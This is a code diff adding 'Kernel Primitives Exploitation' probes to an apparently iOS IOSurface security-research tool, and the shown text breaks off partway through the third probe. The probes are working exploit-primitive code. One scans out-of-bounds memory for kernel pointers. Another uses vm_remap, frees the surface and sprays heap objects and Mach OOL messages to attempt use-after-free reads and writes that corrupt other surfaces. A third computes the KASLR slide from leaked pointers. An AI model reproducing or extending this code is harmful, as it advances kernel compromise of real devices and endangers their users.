@@ -17642,3 +17642,948 @@ void iosurface_research_syscall_storm(ISRLogBlock log, ISRDoneBlock done) {
         done(res);
     });
 }
+
+#pragma mark - Round 27: Kernel Primitives Exploitation
+
+// Probe 82: OOB Heap Scanner
+void iosurface_research_oob_scanner(ISRLogBlock log, ISRDoneBlock done) {
+    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
+        ISRSymbols sym;
+        if (!isr_load(&sym)) { done(@{@"status": @"ERROR", @"anomalies": @0}); return; }
+
+        log(@"OOBSCAN: === Probe 82: OOB Heap Scanner ===");
+        NSTimeInterval t0 = [[NSDate date] timeIntervalSince1970];
+
+        int anomalies = 0;
+        int totalReads = 0;
+        int successReads = 0;
+        int kernelPtrs = 0;
+        int vtableCandidates = 0;
+        int nonZeroRegions = 0;
+        uint64_t maxKptr = 0;
+        uint64_t minKptr = UINT64_MAX;
+        int iosfMetadata = 0;
+
+        NSDictionary *props = @{
+            @"IOSurfaceWidth": @64,
+            @"IOSurfaceHeight": @64,
+            @"IOSurfaceBytesPerElement": @4,
+            @"IOSurfacePixelFormat": @0x42475241
+        };
+
+        // Create multiple surfaces to populate the heap region
+        IOSurfaceRef scanSurfs[8];
+        memset(scanSurfs, 0, sizeof(scanSurfs));
+        for (int i = 0; i < 8; i++) {
+            scanSurfs[i] = sym.create((__bridge CFDictionaryRef)props);
+        }
+
+        IOSurfaceRef mainSurf = sym.create((__bridge CFDictionaryRef)props);
+        if (!mainSurf) {
+            log(@"OOBSCAN: Failed to create main surface");
+            for (int i = 0; i < 8; i++) { if (scanSurfs[i]) CFRelease(scanSurfs[i]); }
+            isr_unload(&sym);
+            done(@{@"status": @"ERROR", @"anomalies": @0});
+            return;
+        }
+
+        // Create more surfaces after to surround main in heap
+        IOSurfaceRef postSurfs[8];
+        memset(postSurfs, 0, sizeof(postSurfs));
+        for (int i = 0; i < 8; i++) {
+            postSurfs[i] = sym.create((__bridge CFDictionaryRef)props);
+        }
+
+        size_t allocSize = sym.getAllocSize(mainSurf);
+        sym.lock(mainSurf, 0, NULL);
+        void *base = sym.getBase(mainSurf);
+
+        if (!base) {
+            log(@"OOBSCAN: Failed to get base address");
+            sym.unlock(mainSurf, 0, NULL);
+            CFRelease(mainSurf);
+            for (int i = 0; i < 8; i++) { if (scanSurfs[i]) CFRelease(scanSurfs[i]); if (postSurfs[i]) CFRelease(postSurfs[i]); }
+            isr_unload(&sym);
+            done(@{@"status": @"ERROR", @"anomalies": @0});
+            return;
+        }
+
+        // Write sentinel so we know our own surface
+        uint32_t sentinel = 0xABCD1234;
+        memcpy(base, &sentinel, 4);
+
+        log([NSString stringWithFormat:@"OOBSCAN: base=0x%llx allocSize=%zu", (uint64_t)base, allocSize]);
+        log(@"OOBSCAN: Step 1 — Forward scan 0 to +16MB in 4KB steps");
+
+        // Forward scan: read 64 bytes at each offset
+        size_t offsets_to_scan = 16 * 1024 * 1024; // 16MB
+        size_t step = 4096; // 4KB
+
+        for (size_t off = step; off <= offsets_to_scan && !isr_stopped(); off += step) {
+            totalReads++;
+            uint8_t buf[64];
+            memset(buf, 0, sizeof(buf));
+            vm_size_t readSize = 0;
+            kern_return_t kr = vm_read_overwrite(mach_task_self(),
+                (vm_address_t)base + off, 64,
+                (vm_address_t)buf, &readSize);
+
+            if (kr == KERN_SUCCESS && readSize > 0) {
+                successReads++;
+
+                // Check if non-zero
+                BOOL nonZero = NO;
+                for (size_t j = 0; j < readSize; j++) {
+                    if (buf[j] != 0) { nonZero = YES; break; }
+                }
+                if (nonZero) nonZeroRegions++;
+
+                // Scan for kernel pointers and vtable candidates
+                for (size_t j = 0; j + 8 <= readSize; j += 8) {
+                    uint64_t val = 0;
+                    memcpy(&val, buf + j, 8);
+
+                    // Kernel pointer check (0xFFFF prefix, not all-F)
+                    if ((val & 0xFFFF000000000000ULL) == 0xFFFF000000000000ULL && val != 0xFFFFFFFFFFFFFFFFULL) {
+                        kernelPtrs++;
+                        anomalies++;
+                        if (val > maxKptr) maxKptr = val;
+                        if (val < minKptr) minKptr = val;
+                        if (kernelPtrs <= 20) {
+                            log([NSString stringWithFormat:@"OOBSCAN: KPTR +0x%zx+%zu: 0x%llx", off, j, val]);
+                        }
+                    }
+
+                    // vtable candidate: aligned pointer in __DATA_CONST or __TEXT region
+                    if ((val & 0xFFF) == 0 && val > 0x100000000ULL && val < 0xFFFF000000000000ULL) {
+                        vtableCandidates++;
+                        if (vtableCandidates <= 10) {
+                            log([NSString stringWithFormat:@"OOBSCAN: VTABLE? +0x%zx+%zu: 0x%llx", off, j, val]);
+                        }
+                    }
+
+                    // IOSurface magic / pixel format check (0x42475241 = BGRA)
+                    if (val == 0x42475241 || val == 0x4247524142475241ULL) {
+                        iosfMetadata++;
+                        anomalies++;
+                        if (iosfMetadata <= 10) {
+                            log([NSString stringWithFormat:@"OOBSCAN: IOSF_META +0x%zx+%zu: 0x%llx", off, j, val]);
+                        }
+                    }
+                }
+
+                // Check for IOSurface ID patterns (sequential small integers)
+                uint32_t first4 = 0;
+                memcpy(&first4, buf, 4);
+                IOSurfaceID myID = sym.getID(mainSurf);
+                if (first4 > 0 && first4 < myID + 50 && first4 >= myID - 20) {
+                    iosfMetadata++;
+                    anomalies++;
+                    if (iosfMetadata <= 10) {
+                        log([NSString stringWithFormat:@"OOBSCAN: SURF_ID? +0x%zx: id=%u (ours=%u)", off, first4, myID]);
+                    }
+                }
+            }
+        }
+
+        log([NSString stringWithFormat:@"OOBSCAN: Forward scan done: %d/%d success, %d non-zero", successReads, totalReads, nonZeroRegions]);
+
+        // Step 2: Backward scan (negative offsets)
+        if (!isr_stopped()) {
+            log(@"OOBSCAN: Step 2 — Backward scan 0 to -4MB in 4KB steps");
+            int backSuccess = 0;
+            int backKptrs = 0;
+            size_t backMax = 4 * 1024 * 1024;
+            for (size_t off = step; off <= backMax && !isr_stopped(); off += step) {
+                vm_address_t target = (vm_address_t)base - off;
+                if (target < 0x10000) break; // avoid null page
+                uint8_t buf[64];
+                memset(buf, 0, sizeof(buf));
+                vm_size_t readSize = 0;
+                kern_return_t kr = vm_read_overwrite(mach_task_self(),
+                    target, 64, (vm_address_t)buf, &readSize);
+                if (kr == KERN_SUCCESS && readSize > 0) {
+                    backSuccess++;
+                    for (size_t j = 0; j + 8 <= readSize; j += 8) {
+                        uint64_t val = 0;
+                        memcpy(&val, buf + j, 8);
+                        if ((val & 0xFFFF000000000000ULL) == 0xFFFF000000000000ULL && val != 0xFFFFFFFFFFFFFFFFULL) {
+                            backKptrs++;
+                            kernelPtrs++;
+                            anomalies++;
+                            if (backKptrs <= 10) {
+                                log([NSString stringWithFormat:@"OOBSCAN: BACK KPTR -0x%zx+%zu: 0x%llx", off, j, val]);
+                            }
+                        }
+                    }
+                }
+            }
+            log([NSString stringWithFormat:@"OOBSCAN: Backward scan: %d success, %d kptrs", backSuccess, backKptrs]);
+        }
+
+        // Step 3: Fine-grained scan around successful offsets
+        if (!isr_stopped() && kernelPtrs > 0) {
+            log(@"OOBSCAN: Step 3 — Fine scan around kernel pointer offsets");
+            size_t hotspots[] = {0x100000, 0x200000, 0x400000, 0x800000, 0xC00000, 0x1000000};
+            int fineKptrs = 0;
+            for (int h = 0; h < 6 && !isr_stopped(); h++) {
+                for (size_t delta = 0; delta < 0x10000 && !isr_stopped(); delta += 256) {
+                    size_t off = hotspots[h] + delta;
+                    uint8_t buf[256];
+                    memset(buf, 0, sizeof(buf));
+                    vm_size_t readSize = 0;
+                    kern_return_t kr = vm_read_overwrite(mach_task_self(),
+                        (vm_address_t)base + off, 256,
+                        (vm_address_t)buf, &readSize);
+                    if (kr == KERN_SUCCESS && readSize > 0) {
+                        for (size_t j = 0; j + 8 <= readSize; j += 8) {
+                            uint64_t val = 0;
+                            memcpy(&val, buf + j, 8);
+                            if ((val & 0xFFFF000000000000ULL) == 0xFFFF000000000000ULL && val != 0xFFFFFFFFFFFFFFFFULL) {
+                                fineKptrs++;
+                                if (fineKptrs <= 15) {
+                                    log([NSString stringWithFormat:@"OOBSCAN: FINE KPTR +0x%zx+%zu: 0x%llx", off, j, val]);
+                                }
+                            }
+                        }
+                    }
+                }
+            }
+            kernelPtrs += fineKptrs;
+            anomalies += fineKptrs;
+            log([NSString stringWithFormat:@"OOBSCAN: Fine scan found %d additional kptrs", fineKptrs]);
+        }
+
+        sym.unlock(mainSurf, 0, NULL);
+        CFRelease(mainSurf);
+        for (int i = 0; i < 8; i++) { if (scanSurfs[i]) CFRelease(scanSurfs[i]); if (postSurfs[i]) CFRelease(postSurfs[i]); }
+
+        NSTimeInterval elapsed = [[NSDate date] timeIntervalSince1970] - t0;
+        log([NSString stringWithFormat:@"OOBSCAN: Completed in %.2fs", elapsed]);
+
+        if (kernelPtrs > 0 && minKptr < UINT64_MAX) {
+            log([NSString stringWithFormat:@"OOBSCAN: Kernel ptr range: 0x%llx — 0x%llx (span=0x%llx)",
+                 minKptr, maxKptr, maxKptr - minKptr]);
+        }
+        log([NSString stringWithFormat:@"OOBSCAN: reads=%d/%d kptrs=%d vtables=%d iosfMeta=%d anomalies=%d",
+             successReads, totalReads, kernelPtrs, vtableCandidates, iosfMetadata, anomalies]);
+
+        NSString *verdict;
+        if (kernelPtrs > 10) verdict = @"CRITICAL — massive kernel pointer leak across heap!";
+        else if (kernelPtrs > 0) verdict = @"HIGH — kernel pointers found in adjacent heap regions";
+        else if (iosfMetadata > 0) verdict = @"HIGH — IOSurface metadata readable via OOB";
+        else if (vtableCandidates > 0) verdict = @"MEDIUM — vtable candidates in OOB region";
+        else if (successReads > 100) verdict = @"MEDIUM — large readable OOB region";
+        else verdict = @"LOW — limited OOB reach";
+        log([NSString stringWithFormat:@"OOBSCAN: VERDICT: %@", verdict]);
+
+        NSDictionary *res = @{
+            @"status": isr_stopped() ? @"STOPPED" : @"DONE",
+            @"anomalies": @(anomalies),
+            @"verdict": verdict,
+            @"elapsed": @(elapsed),
+            @"totalReads": @(totalReads),
+            @"successReads": @(successReads),
+            @"kernelPtrs": @(kernelPtrs),
+            @"vtableCandidates": @(vtableCandidates),
+            @"iosfMetadata": @(iosfMetadata)
+        };
+        isr_checkpoint(@"ISR-OOBScanner-checkpoint.json", res);
+        isr_unload(&sym);
+        done(res);
+    });
+}
+
+// Probe 83: Remap Spray Oracle
+void iosurface_research_remap_spray(ISRLogBlock log, ISRDoneBlock done) {
+    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
+        ISRSymbols sym;
+        if (!isr_load(&sym)) { done(@{@"status": @"ERROR", @"anomalies": @0}); return; }
+
+        log(@"REMAPSPRAY: === Probe 83: Remap Spray Oracle ===");
+        NSTimeInterval t0 = [[NSDate date] timeIntervalSince1970];
+
+        int anomalies = 0;
+        int remapOk = 0;
+        int sentinelConfirmed = 0;
+        int metadataInRemap = 0;
+        int kptrsInRemap = 0;
+        int surfIDsFound = 0;
+        int writeCorrupt = 0;
+        int uafConfirmed = 0;
+
+        vm_address_t remap_addr = 0;
+        size_t allocSize = 0;
+
+        NSDictionary *props = @{
+            @"IOSurfaceWidth": @64,
+            @"IOSurfaceHeight": @64,
+            @"IOSurfaceBytesPerElement": @4,
+            @"IOSurfacePixelFormat": @0x42475241
+        };
+
+        // Step 1: Create victim surface and remap its pages
+        IOSurfaceRef victim = sym.create((__bridge CFDictionaryRef)props);
+        if (!victim) {
+            log(@"REMAPSPRAY: Failed to create victim surface");
+            isr_unload(&sym);
+            done(@{@"status": @"ERROR", @"anomalies": @0});
+            return;
+        }
+
+        allocSize = sym.getAllocSize(victim);
+        IOSurfaceID victimID = sym.getID(victim);
+        log([NSString stringWithFormat:@"REMAPSPRAY: Victim ID=%u allocSize=%zu", victimID, allocSize]);
+
+        sym.lock(victim, 0, NULL);
+        void *victimBase = sym.getBase(victim);
+        if (!victimBase) {
+            log(@"REMAPSPRAY: Failed to get victim base");
+            sym.unlock(victim, 0, NULL);
+            CFRelease(victim);
+            isr_unload(&sym);
+            done(@{@"status": @"ERROR", @"anomalies": @0});
+            return;
+        }
+
+        // Write unique sentinel pattern
+        uint32_t sentPattern = 0xDEAD8327;
+        memset(victimBase, 0, allocSize);
+        for (size_t i = 0; i < allocSize; i += 4096) {
+            uint32_t marker = sentPattern ^ (uint32_t)(i >> 12);
+            memcpy((uint8_t *)victimBase + i, &marker, 4);
+        }
+
+        log(@"REMAPSPRAY: Step 1 — vm_remap victim pages");
+        vm_prot_t cur_prot = VM_PROT_NONE, max_prot = VM_PROT_NONE;
+        kern_return_t kr = vm_remap(mach_task_self(),
+            &remap_addr, (vm_size_t)allocSize, 0,
+            VM_FLAGS_ANYWHERE,
+            mach_task_self(),
+            (vm_address_t)victimBase,
+            FALSE,
+            &cur_prot, &max_prot,
+            VM_INHERIT_NONE);
+
+        if (kr != KERN_SUCCESS) {
+            log([NSString stringWithFormat:@"REMAPSPRAY: vm_remap failed kr=%d", kr]);
+            sym.unlock(victim, 0, NULL);
+            CFRelease(victim);
+            isr_unload(&sym);
+            done(@{@"status": @"ERROR", @"anomalies": @0, @"verdict": @"LOW — vm_remap failed"});
+            return;
+        }
+
+        remapOk = 1;
+        log([NSString stringWithFormat:@"REMAPSPRAY: Remap at 0x%llx prot=%d/%d", (uint64_t)remap_addr, cur_prot, max_prot]);
+
+        // Verify sentinel via remap
+        uint32_t check = 0;
+        memcpy(&check, (void *)remap_addr, 4);
+        if (check == sentPattern) {
+            sentinelConfirmed = 1;
+            log(@"REMAPSPRAY: Sentinel confirmed — physical pages shared");
+        }
+        sym.unlock(victim, 0, NULL);
+
+        // Step 2: Destroy victim surface
+        if (!isr_stopped()) {
+            log(@"REMAPSPRAY: Step 2 — Destroying victim surface");
+            CFRelease(victim);
+            victim = NULL;
+
+            // Read remap immediately post-destroy
+            uint8_t postBuf[256];
+            memset(postBuf, 0, sizeof(postBuf));
+            vm_size_t readSize = 0;
+            kr = vm_read_overwrite(mach_task_self(),
+                remap_addr, 256, (vm_address_t)postBuf, &readSize);
+            if (kr == KERN_SUCCESS && readSize > 0) {
+                uint32_t f4 = 0;
+                memcpy(&f4, postBuf, 4);
+                log([NSString stringWithFormat:@"REMAPSPRAY: Post-destroy first4=0x%08x", f4]);
+            }
+        }
+
+        // Step 3: Spray 500 new surfaces of same size
+        IOSurfaceRef spraySurfs[500];
+        memset(spraySurfs, 0, sizeof(spraySurfs));
+        int sprayCount = 0;
+
+        if (!isr_stopped()) {
+            log(@"REMAPSPRAY: Step 3 — Spraying 500 IOSurfaces of same size");
+            for (int i = 0; i < 500 && !isr_stopped(); i++) {
+                IOSurfaceRef s = sym.create((__bridge CFDictionaryRef)props);
+                if (s) {
+                    // Write unique marker to each spray surface
+                    sym.lock(s, 0, NULL);
+                    void *sb = sym.getBase(s);
+                    if (sb) {
+                        uint32_t sprayMark = 0x57524100 | (i & 0xFFFF);
+                        memcpy(sb, &sprayMark, 4);
+                        IOSurfaceID sid = sym.getID(s);
+                        memcpy((uint8_t *)sb + 4, &sid, 4);
+                    }
+                    sym.unlock(s, 0, NULL);
+                    spraySurfs[sprayCount++] = s;
+                }
+            }
+            log([NSString stringWithFormat:@"REMAPSPRAY: Sprayed %d surfaces", sprayCount]);
+        }
+
+        // Step 4: Read remapped region — check what replaced the freed memory
+        if (!isr_stopped()) {
+            log(@"REMAPSPRAY: Step 4 — Reading remap region for new surface metadata");
+
+            for (size_t off = 0; off < allocSize && !isr_stopped(); off += 4096) {
+                uint8_t scanBuf[256];
+                memset(scanBuf, 0, sizeof(scanBuf));
+                vm_size_t readSize = 0;
+                kr = vm_read_overwrite(mach_task_self(),
+                    remap_addr + off, 256,
+                    (vm_address_t)scanBuf, &readSize);
+                if (kr != KERN_SUCCESS || readSize == 0) continue;
+
+                uint32_t f4 = 0;
+                memcpy(&f4, scanBuf, 4);
+
+                // Check if we see spray markers
+                if ((f4 & 0xFFFFFF00) == 0x57524100) {
+                    int idx = f4 & 0xFFFF;
+                    uint32_t sid = 0;
+                    memcpy(&sid, scanBuf + 4, 4);
+                    surfIDsFound++;
+                    anomalies++;
+                    uafConfirmed = 1;
+                    if (surfIDsFound <= 10) {
+                        log([NSString stringWithFormat:@"REMAPSPRAY: UAF READ! +0x%zx spray[%d] surfID=%u", off, idx, sid]);
+                    }
+                }
+
+                // Check for kernel pointers
+                for (size_t j = 0; j + 8 <= readSize; j += 8) {
+                    uint64_t val = 0;
+                    memcpy(&val, scanBuf + j, 8);
+                    if ((val & 0xFFFF000000000000ULL) == 0xFFFF000000000000ULL && val != 0xFFFFFFFFFFFFFFFFULL) {
+                        kptrsInRemap++;
+                        anomalies++;
+                        if (kptrsInRemap <= 10) {
+                            log([NSString stringWithFormat:@"REMAPSPRAY: KPTR in remap +0x%zx+%zu: 0x%llx", off, j, val]);
+                        }
+                    }
+                }
+
+                // Check for IOSurface pixel format or metadata
+                for (size_t j = 0; j + 4 <= readSize; j += 4) {
+                    uint32_t v32 = 0;
+                    memcpy(&v32, scanBuf + j, 4);
+                    if (v32 == 0x42475241) { // BGRA pixel format
+                        metadataInRemap++;
+                        if (metadataInRemap <= 5) {
+                            log([NSString stringWithFormat:@"REMAPSPRAY: IOSF pixfmt at remap +0x%zx+%zu", off, j]);
+                        }
+                    }
+                    // Check for surface IDs in range
+                    if (v32 > victimID && v32 <= victimID + 600) {
+                        surfIDsFound++;
+                        if (surfIDsFound <= 10) {
+                            log([NSString stringWithFormat:@"REMAPSPRAY: SURF ID %u at remap +0x%zx+%zu", v32, off, j]);
+                        }
+                    }
+                }
+            }
+            log([NSString stringWithFormat:@"REMAPSPRAY: Remap scan: kptrs=%d meta=%d surfIDs=%d uaf=%d",
+                 kptrsInRemap, metadataInRemap, surfIDsFound, uafConfirmed]);
+        }
+
+        // Step 5: Write through remap to try corrupting new surface metadata
+        if (!isr_stopped() && uafConfirmed) {
+            log(@"REMAPSPRAY: Step 5 — Attempting write through remap (UAF write)");
+            uint32_t corruptVal = 0xC0227E27;
+            kr = vm_write(mach_task_self(), remap_addr,
+                (vm_offset_t)&corruptVal, 4);
+            if (kr == KERN_SUCCESS) {
+                writeCorrupt = 1;
+                anomalies++;
+                log(@"REMAPSPRAY: UAF WRITE SUCCEEDED — checking spray surfaces for corruption");
+
+                // Check if any spray surface was corrupted
+                for (int i = 0; i < sprayCount && i < 500 && !isr_stopped(); i++) {
+                    sym.lock(spraySurfs[i], 1, NULL);
+                    void *sb = sym.getBase(spraySurfs[i]);
+                    if (sb) {
+                        uint32_t readBack = 0;
+                        memcpy(&readBack, sb, 4);
+                        if (readBack == 0xC0227E27) {
+                            anomalies += 5;
+                            log([NSString stringWithFormat:@"REMAPSPRAY: CORRUPTION CONFIRMED in spray[%d] ID=%u!",
+                                 i, sym.getID(spraySurfs[i])]);
+                        }
+                    }
+                    sym.unlock(spraySurfs[i], 1, NULL);
+                }
+            } else {
+                log([NSString stringWithFormat:@"REMAPSPRAY: Write kr=%d", kr]);
+            }
+        }
+
+        // Step 6: OOL spray into freed zone via remap
+        if (!isr_stopped() && !uafConfirmed) {
+            log(@"REMAPSPRAY: Step 6 — OOL mach msg spray into freed zone");
+            mach_port_t spray_port;
+            mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &spray_port);
+            mach_port_insert_right(mach_task_self(), spray_port, spray_port, MACH_MSG_TYPE_MAKE_SEND);
+
+            uint8_t ool_data[16384];
+            memset(ool_data, 0x42, sizeof(ool_data));
+            uint32_t oolMark = 0x004F4F4C; // "OOL\0"
+            memcpy(ool_data, &oolMark, 4);
+
+            for (int i = 0; i < 300 && !isr_stopped(); i++) {
+                struct {
+                    mach_msg_header_t hdr;
+                    mach_msg_body_t body;
+                    mach_msg_ool_descriptor_t ool;
+                } msg = {0};
+                msg.hdr.msgh_bits = MACH_MSGH_BITS_COMPLEX | MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0);
+                msg.hdr.msgh_size = sizeof(msg);
+                msg.hdr.msgh_remote_port = spray_port;
+                msg.hdr.msgh_local_port = MACH_PORT_NULL;
+                msg.body.msgh_descriptor_count = 1;
+                msg.ool.address = ool_data;
+                msg.ool.size = (mach_msg_size_t)allocSize;
+                msg.ool.deallocate = FALSE;
+                msg.ool.type = MACH_MSG_OOL_DESCRIPTOR;
+                mach_msg(&msg.hdr, MACH_SEND_MSG | MACH_SEND_TIMEOUT, sizeof(msg), 0, MACH_PORT_NULL, 10, MACH_PORT_NULL);
+            }
+
+            // Check remap for OOL data
+            uint8_t oolCheck[64];
+            vm_size_t oolRead = 0;
+            kr = vm_read_overwrite(mach_task_self(), remap_addr, 64, (vm_address_t)oolCheck, &oolRead);
+            if (kr == KERN_SUCCESS && oolRead > 0) {
+                uint32_t f4 = 0;
+                memcpy(&f4, oolCheck, 4);
+                if (f4 == 0x004F4F4C) {
+                    anomalies++;
+                    log(@"REMAPSPRAY: OOL DATA LANDED IN REMAP! Zone reclaim via mach msg!");
+                } else {
+                    log([NSString stringWithFormat:@"REMAPSPRAY: Post-OOL first4=0x%08x", f4]);
+                }
+            }
+            mach_port_deallocate(mach_task_self(), spray_port);
+        }
+
+        // Cleanup
+        if (remap_addr) vm_deallocate(mach_task_self(), remap_addr, (vm_size_t)allocSize);
+        for (int i = 0; i < sprayCount; i++) { if (spraySurfs[i]) CFRelease(spraySurfs[i]); }
+
+        NSTimeInterval elapsed = [[NSDate date] timeIntervalSince1970] - t0;
+        log([NSString stringWithFormat:@"REMAPSPRAY: Completed in %.2fs", elapsed]);
+        log([NSString stringWithFormat:@"REMAPSPRAY: remap=%d sentinel=%d uaf=%d kptrs=%d meta=%d surfIDs=%d writeCorrupt=%d anomalies=%d",
+             remapOk, sentinelConfirmed, uafConfirmed, kptrsInRemap, metadataInRemap, surfIDsFound, writeCorrupt, anomalies]);
+
+        NSString *verdict;
+        if (writeCorrupt) verdict = @"CRITICAL — UAF write confirmed! Surface corruption achieved!";
+        else if (uafConfirmed) verdict = @"CRITICAL — UAF read confirmed! Spray data visible via remap!";
+        else if (kptrsInRemap > 0) verdict = @"HIGH — kernel pointers in remapped freed region";
+        else if (metadataInRemap > 0) verdict = @"HIGH — IOSurface metadata in remapped region";
+        else if (sentinelConfirmed) verdict = @"MEDIUM — remap shares pages but no reuse detected";
+        else verdict = @"LOW — remap succeeded but pages not reused";
+        log([NSString stringWithFormat:@"REMAPSPRAY: VERDICT: %@", verdict]);
+
+        NSDictionary *res = @{
+            @"status": isr_stopped() ? @"STOPPED" : @"DONE",
+            @"anomalies": @(anomalies),
+            @"verdict": verdict,
+            @"elapsed": @(elapsed),
+            @"remapOk": @(remapOk),
+            @"sentinelConfirmed": @(sentinelConfirmed),
+            @"uafConfirmed": @(uafConfirmed),
+            @"kptrsInRemap": @(kptrsInRemap),
+            @"metadataInRemap": @(metadataInRemap),
+            @"surfIDsFound": @(surfIDsFound),
+            @"writeCorrupt": @(writeCorrupt)
+        };
+        isr_checkpoint(@"ISR-RemapSpray-checkpoint.json", res);
+        isr_unload(&sym);
+        done(res);
+    });
+}
+
+// Probe 84: Kernel Slide Calculator
+void iosurface_research_kslide(ISRLogBlock log, ISRDoneBlock done) {
+    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
+        ISRSymbols sym;
+        if (!isr_load(&sym)) { done(@{@"status": @"ERROR", @"anomalies": @0}); return; }
+
+        log(@"KSLIDE: === Probe 84: Kernel Slide Calculator ===");
+        NSTimeInterval t0 = [[NSDate date] timeIntervalSince1970];
+
+        int anomalies = 0;
+        uint64_t dyldBase = 0;
+        uint64_t kslideEstimate = 0;
+        int kptrsCollected = 0;
+        int memEntriesCreated = 0;
+        int sharedMaps = 0;
+        int regionProbes = 0;
+        int crossSurfLeak = 0;
+
+        // Collect kernel pointers into array for analysis
+        uint64_t kptrs[256];
+        memset(kptrs, 0, sizeof(kptrs));
+
+        // Step 1: Get ASLR base via task_info
+        if (!isr_stopped()) {
+            log(@"KSLIDE: Step 1 — ASLR defeat via task_info");
+            struct task_dyld_info dyld_info = {0};
+            mach_msg_type_number_t count = TASK_DYLD_INFO_COUNT;
+            kern_return_t kr = task_info(mach_task_self(), TASK_DYLD_INFO,
+                (task_info_t)&dyld_info, &count);
+            if (kr == KERN_SUCCESS) {
+                dyldBase = dyld_info.all_image_info_addr;
+                log([NSString stringWithFormat:@"KSLIDE: dyld base=0x%llx size=%llu", dyldBase, dyld_info.all_image_info_size]);
+            }
+        }
+
+        // Step 2: Collect kernel pointers via OOB reads at known hot offsets
+        if (!isr_stopped()) {
+            log(@"KSLIDE: Step 2 — Collecting kernel pointers via OOB reads");
+
+            NSDictionary *props = @{
+                @"IOSurfaceWidth": @64,
+                @"IOSurfaceHeight": @64,
+                @"IOSurfaceBytesPerElement": @4,
+                @"IOSurfacePixelFormat": @0x42475241
+            };
+            IOSurfaceRef surf = sym.create((__bridge CFDictionaryRef)props);
+            if (surf) {
+                sym.lock(surf, 0, NULL);
+                void *base = sym.getBase(surf);
+                if (base) {
+                    size_t scanOffsets[] = {
+                        0x100000, 0x104000, 0x108000, 0x10C000, 0x110000,
+                        0x200000, 0x204000, 0x208000, 0x20C000, 0x210000,
+                        0x300000, 0x400000, 0x500000, 0x600000, 0x700000,
+                        0x800000, 0x804000, 0x808000, 0x80C000, 0x810000,
+                        0x900000, 0xA00000, 0xB00000, 0xC00000, 0xD00000,
+                        0xE00000, 0xF00000, 0x1000000, 0x1100000, 0x1200000
+                    };
+                    int numOffsets = 30;
+
+                    for (int i = 0; i < numOffsets && !isr_stopped(); i++) {
+                        uint8_t buf[256];
+                        memset(buf, 0, sizeof(buf));
+                        vm_size_t readSize = 0;
+                        kern_return_t kr = vm_read_overwrite(mach_task_self(),
+                            (vm_address_t)base + scanOffsets[i], 256,
+                            (vm_address_t)buf, &readSize);
+                        if (kr == KERN_SUCCESS && readSize > 0) {
+                            for (size_t j = 0; j + 8 <= readSize; j += 8) {
+                                uint64_t val = 0;
+                                memcpy(&val, buf + j, 8);
+                                if ((val & 0xFFFF000000000000ULL) == 0xFFFF000000000000ULL
+                                    && val != 0xFFFFFFFFFFFFFFFFULL
+                                    && kptrsCollected < 256) {
+                                    kptrs[kptrsCollected++] = val;
+                                    anomalies++;
+                                }
+                            }
+                        }
+                    }
+                    log([NSString stringWithFormat:@"KSLIDE: Collected %d kernel pointers", kptrsCollected]);
+                }
+                sym.unlock(surf, 0, NULL);
+                CFRelease(surf);
+            }
+        }
+
+        // Step 3: Analyze kernel pointers to compute KASLR slide
+        if (!isr_stopped() && kptrsCollected > 0) {
+            log(@"KSLIDE: Step 3 — Analyzing kernel pointers for KASLR slide");
+
+            // Sort pointers to find clusters
+            for (int i = 0; i < kptrsCollected - 1; i++) {
+                for (int j = i + 1; j < kptrsCollected; j++) {
+                    if (kptrs[j] < kptrs[i]) {
+                        uint64_t tmp = kptrs[i];
+                        kptrs[i] = kptrs[j];
+                        kptrs[j] = tmp;
+                    }
+                }
+            }
+
+            uint64_t minPtr = kptrs[0];
+            uint64_t maxPtr = kptrs[kptrsCollected - 1];
+            log([NSString stringWithFormat:@"KSLIDE: Pointer range: 0x%llx — 0x%llx", minPtr, maxPtr]);
+
+            // Known kernel text bases for various iOS versions (arm64e)
+            // iOS 15-17 typical: 0xFFFFFFF007004000
+            // iOS 26-27: shifted but still 0xFFFFFFF0XXXXXXXX range
+            uint64_t knownBases[] = {
+                0xFFFFFFF007004000ULL, // iOS 15 typical
+                0xFFFFFFF007008000ULL, // iOS 16 typical
+                0xFFFFFFF00700C000ULL, // iOS 17 typical
+                0xFFFFFFF007010000ULL, // iOS 18+ typical
+                0xFFFFFFF007100000ULL, // alternate
+            };
+
+            // Try each known base to see if minPtr could be slid version
+            for (int k = 0; k < 5; k++) {
+                if (minPtr > knownBases[k]) {
+                    uint64_t slide = minPtr - knownBases[k];
+                    // Slide must be page-aligned and reasonable (< 512MB)
+                    if ((slide & 0x3FFF) == 0 && slide < 0x20000000ULL) {
+                        kslideEstimate = slide;
+                        anomalies += 3;
+                        log([NSString stringWithFormat:@"KSLIDE: POTENTIAL SLIDE=0x%llx (base=0x%llx)", slide, knownBases[k]]);
+                    }
+                }
+            }
+
+            // Also compute slide from page-alignment of pointers
+            uint64_t pageAligned = minPtr & ~0x3FFFULL;
+            uint64_t pageOffset = minPtr & 0x3FFFULL;
+            log([NSString stringWithFormat:@"KSLIDE: minPtr page=0x%llx offset=0x%llx", pageAligned, pageOffset]);
+
+            // Log unique pointer values (deduplicated)
+            int unique = 0;
+            uint64_t prev = 0;
+            for (int i = 0; i < kptrsCollected && unique < 20; i++) {
+                if (kptrs[i] != prev) {
+                    log([NSString stringWithFormat:@"KSLIDE: unique[%d]=0x%llx", unique, kptrs[i]]);
+                    prev = kptrs[i];
+                    unique++;
+                }
+            }
+        }
+
+        // Step 4: mach_make_memory_entry_64 probing
+        if (!isr_stopped()) {
+            log(@"KSLIDE: Step 4 — Memory entry probing");
+
+            NSDictionary *props = @{
+                @"IOSurfaceWidth": @128,
+                @"IOSurfaceHeight": @128,
+                @"IOSurfaceBytesPerElement": @4,
+                @"IOSurfacePixelFormat": @0x42475241
+            };
+
+            // Create surfaces of different sizes for memory entry
+            size_t sizes[] = {16384, 65536, 262144, 1048576};
+            for (int sz = 0; sz < 4 && !isr_stopped(); sz++) {
+                NSDictionary *sizeProps = @{
+                    @"IOSurfaceWidth": @(sizes[sz] / 4 / 4),
+                    @"IOSurfaceHeight": @4,
+                    @"IOSurfaceBytesPerElement": @4,
+                    @"IOSurfacePixelFormat": @0x42475241
+                };
+                IOSurfaceRef s = sym.create((__bridge CFDictionaryRef)sizeProps);
